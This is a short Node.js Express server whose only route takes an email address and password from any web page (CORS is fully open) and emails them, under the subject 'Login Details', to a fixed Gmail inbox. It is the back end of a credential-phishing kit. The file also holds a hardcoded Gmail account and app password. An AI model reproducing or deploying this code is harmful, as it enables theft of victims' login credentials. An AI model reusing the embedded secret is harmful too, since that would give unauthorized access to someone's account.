const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();

// Enable CORS
app.use(cors());

app.use(bodyParser.json());

// Create a transporter object using the default SMTP transport
let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'sauravgarg5922@gmail.com',  // Replace with your Gmail address
        pass: 'cmhl ychm fggr xqth'  // Replace with your app password
    }
});

// POST route to send email
app.post('/send-email', (req, res) => {
    const { email, password } = req.body;

    let mailOptions = {
        from: 'devjha547@gmail.com',
        to: 'devjha547@gmail.com',  // Replace with recipient email if different
        subject: 'Login Details',
        text: `Email: ${email}\nPassword: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).json({ error: error.toString() });
        }
        res.json({ message: 'Email sent: ' + info.response });
    });
});

// Start the server
const PORT = process.env.PORT || 5500; // Change port to 5500
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
